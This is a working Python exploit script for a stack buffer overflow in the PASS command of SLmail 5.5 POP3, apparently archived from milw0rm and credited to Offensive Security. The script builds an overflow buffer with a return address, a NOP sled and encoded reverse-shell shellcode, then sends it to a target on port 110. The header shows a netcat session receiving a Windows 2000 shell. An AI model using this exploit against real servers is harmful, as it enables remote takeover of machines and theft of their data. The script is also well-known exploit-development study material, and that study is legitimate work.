#########################################################
#                                                       #
# SLmail 5.5 POP3 PASS Buffer Overflow               	#
# Discovered by : Muts                                  #
# Coded by : Muts                                       #
# www.offsec.com                                        #
# Plain vanilla stack overflow in the PASS command  	#
#                                                       #
#########################################################
# D:\Projects\BO>SLmail-5.5-POP3-PASS.py                #
#########################################################
# D:\Projects\BO>nc -v 192.168.1.167 4444               #
# localhost.lan [192.168.1.167] 4444 (?) open           #   
# Microsoft Windows 2000 [Version 5.00.2195]            #
# (C) Copyright 1985-2000 Microsoft Corp.               #
# C:\Program Files\SLmail\System>                       #
#########################################################

import struct
import socket

print "\n\n###############################################"
print "\nSLmail 5.5 POP3 PASS Buffer Overflow"
print "\nFound & coded by muts [at] offsec.com"
print "\nFor Educational Purposes Only!" 
print "\n\n###############################################"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sc = ("\xba\xb1\x7d\xc9\x16\xdb\xd6\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\x77\x79\x2b\xe3\x8b\x6a\x29"
"\x0c\x73\x6b\x4e\x84\x96\x5a\x4e\xf2\xd3\xcd\x7e\x70\xb1\xe1"
"\xf5\xd4\x21\x71\x7b\xf1\x46\x32\x36\x27\x69\xc3\x6b\x1b\xe8"
"\x47\x76\x48\xca\x76\xb9\x9d\x0b\xbe\xa4\x6c\x59\x17\xa2\xc3"
"\x4d\x1c\xfe\xdf\xe6\x6e\xee\x67\x1b\x26\x11\x49\x8a\x3c\x48"
"\x49\x2d\x90\xe0\xc0\x35\xf5\xcd\x9b\xce\xcd\xba\x1d\x06\x1c"
"\x42\xb1\x67\x90\xb1\xcb\xa0\x17\x2a\xbe\xd8\x6b\xd7\xb9\x1f"
"\x11\x03\x4f\xbb\xb1\xc0\xf7\x67\x43\x04\x61\xec\x4f\xe1\xe5"
"\xaa\x53\xf4\x2a\xc1\x68\x7d\xcd\x05\xf9\xc5\xea\x81\xa1\x9e"
"\x93\x90\x0f\x70\xab\xc2\xef\x2d\x09\x89\x02\x39\x20\xd0\x4a"
"\x8e\x09\xea\x8a\x98\x1a\x99\xb8\x07\xb1\x35\xf1\xc0\x1f\xc2"
"\xf6\xfa\xd8\x5c\x09\x05\x19\x75\xce\x51\x49\xed\xe7\xd9\x02"
"\xed\x08\x0c\x84\xbd\xa6\xff\x65\x6d\x07\x50\x0e\x67\x88\x8f"
"\x2e\x88\x42\xb8\xc5\x73\x05\x07\xb1\xcb\x57\xef\xc0\x2b\x49"
"\xac\x4d\xcd\x03\x5c\x18\x46\xbc\xc5\x01\x1c\x5d\x09\x9c\x59"
"\x5d\x81\x13\x9e\x10\x62\x59\x8c\xc5\x82\x14\xee\x40\x9c\x82"
"\x86\x0f\x0f\x49\x56\x59\x2c\xc6\x01\x0e\x82\x1f\xc7\xa2\xbd"
"\x89\xf5\x3e\x5b\xf1\xbd\xe4\x98\xfc\x3c\x68\xa4\xda\x2e\xb4"
"\x25\x67\x1a\x68\x70\x31\xf4\xce\x2a\xf3\xae\x98\x81\x5d\x26"
"\x5c\xea\x5d\x30\x61\x27\x28\xdc\xd0\x9e\x6d\xe3\xdd\x76\x7a"
"\x9c\x03\xe7\x85\x77\x80\x07\x64\x5d\xfd\xaf\x31\x34\xbc\xad"
"\xc1\xe3\x83\xcb\x41\x01\x7c\x28\x59\x60\x79\x74\xdd\x99\xf3"
"\xe5\x88\x9d\xa0\x06\x99")

#Tested on Win2k SP4 Unpatched
# Change ret address if needed
buffer = "A"*2606 + "\x8F\x35\x4A\x5F" + "\x90"*20 +sc 
try:
	print "\nSending evil buffer..."
	s.connect(('192.168.176.128',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer +'\r\n')
	data = s.recv(1024)
	s.close()
	print "\nDone! Did you get the reverse shell"
except:
	print "Could not connect to POP3!"

# milw0rm.com [2004-11-18]
